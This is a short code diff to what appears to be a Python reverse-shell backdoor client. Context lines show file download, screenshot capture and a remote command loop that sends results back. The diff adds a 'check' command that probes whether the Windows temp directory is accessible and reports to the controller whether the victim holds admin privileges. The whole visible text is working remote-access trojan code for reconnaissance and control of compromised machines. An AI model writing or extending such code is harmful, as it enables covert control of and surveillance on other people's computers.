@@ -21,6 +21,14 @@ def downlaod(url):
 	with open(file_name,"wb") as out_file:
 		out_file.write(get_response.content)
 
+def is_admin():
+	global admin
+	try:
+		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
+	except:
+		admin = "[!!] User Priviliges!"
+	else:
+		admin = "[+] Admin Priviliges"
 
 def relibale_send(data):
 	try:
@@ -85,6 +93,12 @@ def shell():
 			except Exception as e:
 				print(e)
 				relibale_send("[!!] Failed to take screenshoot. ")
+		elif command[:5] == "check":
+			try:
+				is_admin()
+				relibale_send(admin.encode('utf-8'))
+			except:
+				relibale_send("cannot perform check".encode('utf-8'))
 		
 		else:
 			try:
